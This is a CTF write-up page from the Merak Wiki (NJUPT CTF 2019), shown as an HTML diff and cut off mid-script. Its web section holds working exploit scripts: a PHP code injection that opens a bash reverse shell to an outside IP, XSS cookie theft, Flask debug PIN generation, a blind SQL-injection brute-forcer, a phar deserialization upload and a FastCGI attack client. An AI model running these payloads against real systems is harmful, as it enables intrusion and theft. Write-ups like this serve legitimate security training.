@@ -1,0 +1,2377 @@
+
+
+
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      <meta http-equiv="x-ua-compatible" content="ie=edge">
+      
+      
+      
+      
+        <meta name="lang:clipboard.copy" content="Copy to clipboard">
+      
+        <meta name="lang:clipboard.copied" content="Copied to clipboard">
+      
+        <meta name="lang:search.language" content="en">
+      
+        <meta name="lang:search.pipeline.stopwords" content="True">
+      
+        <meta name="lang:search.pipeline.trimmer" content="True">
+      
+        <meta name="lang:search.result.none" content="No matching documents">
+      
+        <meta name="lang:search.result.one" content="1 matching document">
+      
+        <meta name="lang:search.result.other" content="# matching documents">
+      
+        <meta name="lang:search.tokenizer" content="[\s\-]+">
+      
+      <link rel="shortcut icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.5.0">
+    
+    
+      
+        <title>NJUPT CTF 天璇Writeup - Merak Wiki</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/application.1b62728e.css">
+      
+      
+    
+    
+      <script src="../../assets/javascripts/modernizr.268332fc.js"></script>
+    
+    
+      
+        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700|Roboto+Mono&display=fallback">
+        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
+      
+    
+    <link rel="stylesheet" href="../../assets/fonts/material-icons.css">
+    
+    
+    
+      
+    
+    
+  </head>
+  
+    <body dir="ltr">
+  
+    <svg class="md-svg">
+      <defs>
+        
+        
+      </defs>
+    </svg>
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
+    
+      <a href="#njupt-ctf-writeup" tabindex="1" class="md-skip">
+        Skip to content
+      </a>
+    
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid">
+    <div class="md-flex">
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <a href="../.." title="Merak Wiki" class="md-header-nav__button md-logo">
+          
+            <i class="md-icon"></i>
+          
+        </a>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
+      </div>
+      <div class="md-flex__cell md-flex__cell--stretch">
+        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
+          
+            <span class="md-header-nav__topic">
+              Merak Wiki
+            </span>
+            <span class="md-header-nav__topic">
+              
+                NJUPT CTF 天璇Writeup
+              
+            </span>
+          
+        </div>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        
+          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
+          
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
+      <label class="md-icon md-search__icon" for="__search"></label>
+      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
+        &#xE5CD;
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="result">
+          <div class="md-search-result__meta">
+            Type to start searching
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+        
+      </div>
+      
+    </div>
+  </nav>
+</header>
+    
+    <div class="md-container">
+      
+        
+      
+      
+        
+
+  
+
+<nav class="md-tabs md-tabs--active" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  <li class="md-tabs__item">
+    
+      <a href="../.." class="md-tabs__link">
+        Merak Wiki
+      </a>
+    
+  </li>
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="./" class="md-tabs__link md-tabs__link--active">
+          Writeup
+        </a>
+      
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+      
+      <main class="md-main" role="main">
+        <div class="md-main__inner md-grid" data-md-component="container">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    <nav class="md-nav md-nav--primary" data-md-level="0">
+  <label class="md-nav__title md-nav__title--site" for="__drawer">
+    <a href="../.." title="Merak Wiki" class="md-nav__button md-logo">
+      
+        <i class="md-icon"></i>
+      
+    </a>
+    Merak Wiki
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../.." title="Merak Wiki" class="md-nav__link">
+      Merak Wiki
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" checked>
+    
+    <label class="md-nav__link" for="nav-2">
+      Writeup
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        Writeup
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+      
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        NJUPT CTF 天璇Writeup
+      </label>
+    
+    <a href="./" title="NJUPT CTF 天璇Writeup" class="md-nav__link md-nav__link--active">
+      NJUPT CTF 天璇Writeup
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#web" class="md-nav__link">
+    Web
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#hacker_backdoor" class="md-nav__link">
+    hacker_backdoor
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#simple-xss" class="md-nav__link">
+    simple XSS
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#flask_website" class="md-nav__link">
+    flask_website
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sqli" class="md-nav__link">
+    SQLi
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#easyphp" class="md-nav__link">
+    easyphp
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phar-matches-everything" class="md-nav__link">
+    phar matches everything(推荐好好研究一下)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fake-xml-cookbook" class="md-nav__link">
+    Fake XML cookbook
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#true-xml-cookbook" class="md-nav__link">
+    True XML cookbook
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#flask" class="md-nav__link">
+    flask
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#upload-your-shell" class="md-nav__link">
+    Upload your Shell
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#replace" class="md-nav__link">
+    replace
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pwn" class="md-nav__link">
+    Pwn
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#hello_pwn" class="md-nav__link">
+    hello_pwn
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pwn_me_1" class="md-nav__link">
+    pwn_me_1
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pwn_me_2" class="md-nav__link">
+    pwn_me_2
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pwn_me_3" class="md-nav__link">
+    pwn_me_3
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#warmup" class="md-nav__link">
+    warmup
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#easy_rop" class="md-nav__link">
+    easy_rop
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#easy_heap" class="md-nav__link">
+    easy_heap
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#re" class="md-nav__link">
+    Re
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    签到题
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#debug" class="md-nav__link">
+    debug
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#easy-ternary" class="md-nav__link">
+    Easy Ternary
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    丑陋的代码
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#f-bird" class="md-nav__link">
+    F-Bird
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#misc" class="md-nav__link">
+    Misc
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#nctf2019" class="md-nav__link">
+    NCTF2019问卷调查
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pip2-install" class="md-nav__link">
+    PiP2 install
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#a_good_idea" class="md-nav__link">
+    a_good_idea
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#whats-this" class="md-nav__link">
+    what`s this
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#become-a-rockstar" class="md-nav__link">
+    Become a Rockstar
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    小狗的秘密
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2077" class="md-nav__link">
+    2077
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#crypto" class="md-nav__link">
+    Crypto
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#keyboard" class="md-nav__link">
+    keyboard
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#web" class="md-nav__link">
+    Web
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#hacker_backdoor" class="md-nav__link">
+    hacker_backdoor
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#simple-xss" class="md-nav__link">
+    simple XSS
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#flask_website" class="md-nav__link">
+    flask_website
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sqli" class="md-nav__link">
+    SQLi
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#easyphp" class="md-nav__link">
+    easyphp
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phar-matches-everything" class="md-nav__link">
+    phar matches everything(推荐好好研究一下)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fake-xml-cookbook" class="md-nav__link">
+    Fake XML cookbook
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#true-xml-cookbook" class="md-nav__link">
+    True XML cookbook
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#flask" class="md-nav__link">
+    flask
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#upload-your-shell" class="md-nav__link">
+    Upload your Shell
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#replace" class="md-nav__link">
+    replace
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pwn" class="md-nav__link">
+    Pwn
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#hello_pwn" class="md-nav__link">
+    hello_pwn
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pwn_me_1" class="md-nav__link">
+    pwn_me_1
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pwn_me_2" class="md-nav__link">
+    pwn_me_2
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pwn_me_3" class="md-nav__link">
+    pwn_me_3
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#warmup" class="md-nav__link">
+    warmup
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#easy_rop" class="md-nav__link">
+    easy_rop
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#easy_heap" class="md-nav__link">
+    easy_heap
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#re" class="md-nav__link">
+    Re
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    签到题
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#debug" class="md-nav__link">
+    debug
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#easy-ternary" class="md-nav__link">
+    Easy Ternary
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    丑陋的代码
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#f-bird" class="md-nav__link">
+    F-Bird
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#misc" class="md-nav__link">
+    Misc
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#nctf2019" class="md-nav__link">
+    NCTF2019问卷调查
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pip2-install" class="md-nav__link">
+    PiP2 install
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#a_good_idea" class="md-nav__link">
+    a_good_idea
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#whats-this" class="md-nav__link">
+    what`s this
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#become-a-rockstar" class="md-nav__link">
+    Become a Rockstar
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    小狗的秘密
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2077" class="md-nav__link">
+    2077
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#crypto" class="md-nav__link">
+    Crypto
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#keyboard" class="md-nav__link">
+    keyboard
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                
+                <h1 id="njupt-ctf-writeup">NJUPT CTF 天璇Writeup</h1>
+<h2 id="web">Web</h2>
+<h3 id="hacker_backdoor">hacker_backdoor</h3>
+<p>这里是disable_function忘记添加proc_open，用curl带出来就好</p>
+<pre><code class="python">import requests
+url = &quot;http://nctf2019.x1ct34m.com:60004/?useful=/etc/passwd&amp;code=$a=%22create_f%22.%22unction%22;$c=$a(%27%27,$_POST[a]);$c();&quot;
+print requests.post(url,data={'a':&quot;&quot;&quot;
+$descriptorspec=array(
+    0=&gt;array('pipe','r'), //STDIN
+    1=&gt;array('pipe','w'),//STDOUT
+    2=&gt;array('pipe','w') //STDERROR
+);
+$handle=proc_open('bash -c &quot;bash -i &gt;&amp; /dev/tcp/122.152.230.160/2333 0&gt;&amp;1&quot;',$descriptorspec,$pipes,NULL);
+var_dump($handle);
+
+&quot;&quot;&quot;}).text
+
+</code></pre>
+
+<h3 id="simple-xss">simple XSS</h3>
+<p>随便注册后发现直接可以XSS，但是没有任何方向，这个时候admin账户被注册过了，想法是直接用admin的cookie登入，搭建好平台后，向admin发送XSS payload，瞬间看到了admin的cookie.
+<img alt="" src="https://s2.ax1x.com/2019/11/24/MX8aK1.png" /></p>
+<p>burp将其自己用户的COOKIE替换成为admin的cookie，得到flag：NCTF{Th1s_is_a_Simple_xss}</p>
+<h3 id="flask_website">flask_website</h3>
+<p>任意文件读+PIN-Debug，docker模式下machine—id有变化。更新脚本即可</p>
+<p>参考文献：<a href="https://xz.aliyun.com/t/2553">Flask debug pin安全问题</a></p>
+<pre><code class="python">#!/usr/bin/python2.7
+#coding:utf-8
+
+from sys import *
+import requests
+import re
+from itertools import chain
+import hashlib
+
+def genpin(mac,mid):
+
+    probably_public_bits = [
+        'ctf',# username
+        'flask.app',# modname
+        'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
+        '/usr/local/lib/python3.6/site-packages/flask/app.py' # getattr(mod, '__file__', None),
+    ]
+    mac = &quot;0x&quot;+mac.replace(&quot;:&quot;,&quot;&quot;)
+    mac = int(mac,16)
+    private_bits = [
+        str(mac),# str(uuid.getnode()),  /sys/class/net/eth0/address
+        str(mid)# get_machine_id(), /proc/sys/kernel/random/boot_id
+    ]
+
+    h = hashlib.md5()
+    for bit in chain(probably_public_bits, private_bits):
+        if not bit:
+            continue
+        if isinstance(bit, str):
+            bit = bit.encode('utf-8')
+        h.update(bit)
+    h.update(b'cookiesalt')
+
+    num = None
+    if num is None:
+        h.update(b'pinsalt')
+        num = ('%09d' % int(h.hexdigest(), 16))[:9]
+
+    rv =None
+    if rv is None:
+        for group_size in 5, 4, 3:
+            if len(num) % group_size == 0:
+                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
+                            for x in range(0, len(num), group_size))
+                break
+        else:
+            rv = num
+
+    return rv
+# 02:42:ac:16:00:02  /sys/class/net/eth0/address
+# 21e83dfd-206c-4e80-86be-e8d0afc467a1  /proc/sys/kernel/random/boot_id
+
+def getcode(content):
+    try:
+        return re.findall(r&quot;&lt;pre&gt;([\s\S]*)&lt;/pre&gt;&quot;,content)[0].split()[0]
+    except:
+        return ''
+def getshell():
+    print genpin(&quot;02:42:ac:16:00:02&quot;,&quot;8657e88ac278e9225ba324bb8033ca3398c16c7b517417b55c1f164e90d97a46&quot;)
+
+if __name__ == '__main__':
+    print(getshell())
+
+</code></pre>
+
+<h3 id="sqli">SQLi</h3>
+<p>原题,使用REGEXP正则</p>
+<pre><code class="python">import requests
+
+url = &quot;http://nctf2019.x1ct34m.com:40005/index.php&quot;
+flag = &quot;&quot;
+k = 0
+list = &quot;qwertyuiopasdfghjklzxcvbnm_0123456789&quot;
+while True:
+    k+= 1
+    print k,
+    for i in list:
+        p = len(requests.post(url,data={
+            &quot;passwd&quot;:&quot;&quot;&quot;||passwd/**/REGEXP/**/&quot;^\\{}&quot;;\x00&quot;&quot;&quot;.format(flag+i),
+            &quot;username&quot;:'\\'
+        }).text)
+        if p == 48:
+            # print chr(i)
+            flag += i
+            print flag
+            break
+
+
+</code></pre>
+
+<h3 id="easyphp">easyphp</h3>
+<p>套娃题，没啥说的</p>
+<blockquote>
+<p><code>http://nctf2019.x1ct34m.com:60005/?num=23333%0a&amp;str1=2120624&amp;str2=240610708&amp;q%20w%20q=c\at%20*</code></p>
+</blockquote>
+<h3 id="phar-matches-everything">phar matches everything(推荐好好研究一下)</h3>
+<ol>
+<li>根据vim交换文件得到文件源码</li>
+<li>第二步根据<a href="https://paper.seebug.org/680/">Phar</a>构造反序列化</li>
+<li>使用curl得到SSTI</li>
+<li>最后内网扫描得到一个hint =&gt; fpm</li>
+<li>然后通过gopher协议得到</li>
+</ol>
+<p>Phar+SSTI+FPM</p>
+<pre><code class="php">&lt;?php
+
+class Easytest{
+    protected $test;
+    public function __construct(){
+        $this-&gt;test = '1';
+    }
+    public function funny_get(){
+        return $this-&gt;test;
+    }
+}
+class Main {
+    public $url;
+    public function curl($url){
+        $ch = curl_init();  
+        curl_setopt($ch,CURLOPT_URL,$url);
+        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
+        $output=curl_exec($ch);
+        curl_close($ch);
+        return $output;
+    }
+
+    public function __destruct(){
+        $this_is_a_easy_test=unserialize($_GET['careful']);
+        if($this_is_a_easy_test-&gt;funny_get() === '1'){
+            echo $this-&gt;curl($this-&gt;url);
+        }
+    }    
+}
+
+$a = new Easytest();
+echo urlencode(serialize($a));
+//O%3A8%3A%22Easytest%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00test%22%3Bs%3A1%3A%221%22%3B%7D
+$m = new Main();
+
+$url = $argv[1];
+$m-&gt;url = &quot;&quot;;
+
+
+</code></pre>
+
+<pre><code class="python">#!coding=utf8
+import requests
+import re
+file = open('phar.phar')
+
+url1 = &quot;http://nctf2019.x1ct34m.com:40004/upload.php&quot;
+url2 = &quot;http://nctf2019.x1ct34m.com:40004/catchmime.php?careful=O%3A8%3A%22Easytest%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00test%22%3Bs%3A1%3A%221%22%3B%7D&quot;
+
+def upload():
+    content = requests.post(url1,files={&quot;fileToUpload&quot;:('1.gif',file)}).text
+    print content
+    return re.findall(r&quot;file (.*) has&quot;,content)[0].strip()
+
+def req(filename):
+    print requests.post(url2,data={
+        'name':'phar:///var/www/html/uploads/{}/test.txt'.format(filename),
+        'submit':1
+    }).text
+
+name = upload()
+print name
+req(name)
+
+</code></pre>
+
+<pre><code class="python">import socket
+import random
+import argparse
+import sys
+from io import BytesIO
+
+# Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client
+
+PY2 = True if sys.version_info.major == 2 else False
+
+
+def bchr(i):
+    if PY2:
+        return force_bytes(chr(i))
+    else:
+        return bytes([i])
+
+def bord(c):
+    if isinstance(c, int):
+        return c
+    else:
+        return ord(c)
+
+def force_bytes(s):
+    if isinstance(s, bytes):
+        return s
+    else:
+        return s.encode('utf-8', 'strict')
+
+def force_text(s):
+    if issubclass(type(s), str):
+        return s
+    if isinstance(s, bytes):
+        s = str(s, 'utf-8', 'strict')
+    else:
+        s = str(s)
+    return s
+
+
+class FastCGIClient:
+    &quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot;
+
+    # private
+    __FCGI_VERSION = 1
+
+    __FCGI_ROLE_RESPONDER = 1
+    __FCGI_ROLE_AUTHORIZER = 2
+    __FCGI_ROLE_FILTER = 3
+
+    __FCGI_TYPE_BEGIN = 1
+    __FCGI_TYPE_ABORT = 2
+    __FCGI_TYPE_END = 3
+    __FCGI_TYPE_PARAMS = 4
+    __FCGI_TYPE_STDIN = 5
+    __FCGI_TYPE_STDOUT = 6
+    __FCGI_TYPE_STDERR = 7
+    __FCGI_TYPE_DATA = 8
+    __FCGI_TYPE_GETVALUES = 9
+    __FCGI_TYPE_GETVALUES_RESULT = 10
+    __FCGI_TYPE_UNKOWNTYPE = 11
+
+    __FCGI_HEADER_SIZE = 8
+
+    # request state
+    FCGI_STATE_SEND = 1
+    FCGI_STATE_ERROR = 2
+    FCGI_STATE_SUCCESS = 3
+
+    def __init__(self, host, port, timeout, keepalive):
+        self.host = host
+        self.port = port
+        self.timeout = timeout
+        if keepalive:
+            self.keepalive = 1
+        else:
+            self.keepalive = 0
+        self.sock = None
+        self.requests = dict()
+
+    def __connect(self):
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.sock.settimeout(self.timeout)
+        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        # if self.keepalive:
+        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)
+        # else:
+        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)
+        try:
+            self.sock.connect((self.host, int(self.port)))
+        except socket.error as msg:
+            self.sock.close()
+            self.sock = None
+            print(repr(msg))
+            return False
+        return True
+
+    def __encodeFastCGIRecord(self, fcgi_type, content, requestid):
+        length = len(content)
+        buf = bchr(FastCGIClient.__FCGI_VERSION) \
+               + bchr(fcgi_type) \
+               + bchr((requestid &gt;&gt; 8) &amp; 0xFF) \
+               + bchr(requestid &amp; 0xFF) \
+               + bchr((length &gt;&gt; 8) &amp; 0xFF) \
+               + bchr(length &amp; 0xFF) \
+               + bchr(0) \
+               + bchr(0) \
+               + content
+        return buf
+
+    def __encodeNameValueParams(self, name, value):
+        nLen = len(name)
+        vLen = len(value)
+        record = b''
+        if nLen &lt; 128:
+            record += bchr(nLen)
+        else:
+            record += bchr((nLen &gt;&gt; 24) | 0x80) \
+                      + bchr((nLen &gt;&gt; 16) &amp; 0xFF) \
+                      + bchr((nLen &gt;&gt; 8) &amp; 0xFF) \
+                      + bchr(nLen &amp; 0xFF)
+        if vLen &lt; 128:
+            record += bchr(vLen)
+        else:
+            record += bchr((vLen &gt;&gt; 24) | 0x80) \
+                      + bchr((vLen &gt;&gt; 16) &amp; 0xFF) \
+                      + bchr((vLen &gt;&gt; 8) &amp; 0xFF) \
+                      + bchr(vLen &amp; 0xFF)
+        return record + name + value
+
+    def __decodeFastCGIHeader(self, stream):
+        header = dict()
+        header['version'] = bord(stream[0])
+        header['type'] = bord(stream[1])
+        header['requestId'] = (bord(stream[2]) &lt;&lt; 8) + bord(stream[3])
+        header['contentLength'] = (bord(stream[4]) &lt;&lt; 8) + bord(stream[5])
+        header['paddingLength'] = bord(stream[6])
+        header['reserved'] = bord(stream[7])
+        return header
+
+    def __decodeFastCGIRecord(self, buffer):
+        header = buffer.read(int(self.__FCGI_HEADER_SIZE))
+
+        if not header:
+            return False
+        else:
+            record = self.__decodeFastCGIHeader(header)
+            record['content'] = b''
+
+            if 'contentLength' in record.keys():
+                contentLength = int(record['contentLength'])
+                record['content'] += buffer.read(contentLength)
+            if 'paddingLength' in record.keys():
+                skiped = buffer.read(int(record['paddingLength']))
+            return record
+
+    def request(self, nameValuePairs={}, post=''):
+        if not self.__connect():
+            print('connect failure! please check your fasctcgi-server !!')
+            return
+
+        requestId = random.randint(1, (1 &lt;&lt; 16) - 1)
+        self.requests[requestId] = dict()
+        request = b&quot;&quot;
+        beginFCGIRecordContent = bchr(0) \
+                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \
+                                 + bchr(self.keepalive) \
+                                 + bchr(0) * 5
+        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,
+                                              beginFCGIRecordContent, requestId)
+        paramsRecord = b''
+        if nameValuePairs:
+            for (name, value) in nameValuePairs.items():
+                name = force_bytes(name)
+                value = force_bytes(value)
+                paramsRecord += self.__encodeNameValueParams(name, value)
+
+        if paramsRecord:
+            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)
+        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)
+
+        if post:
+            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)
+        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)
+
+        self.sock.send(request)
+        self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND
+        self.requests[requestId]['response'] = b''
+        return self.__waitForResponse(requestId)
+
+    def __waitForResponse(self, requestId):
+        data = b''
+        while True:
+            buf = self.sock.recv(512)
+            if not len(buf):
+                break
+            data += buf
+
+        data = BytesIO(data)
+        while True:
+            response = self.__decodeFastCGIRecord(data)
+            if not response:
+                break
+            if response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \
+                    or response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:
+                if response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:
+                    self.requests['state'] = FastCGIClient.FCGI_STATE_ERROR
+                if requestId == int(response['requestId']):
+                    self.requests[requestId]['response'] += response['content']
+            if response['type'] == FastCGIClient.FCGI_STATE_SUCCESS:
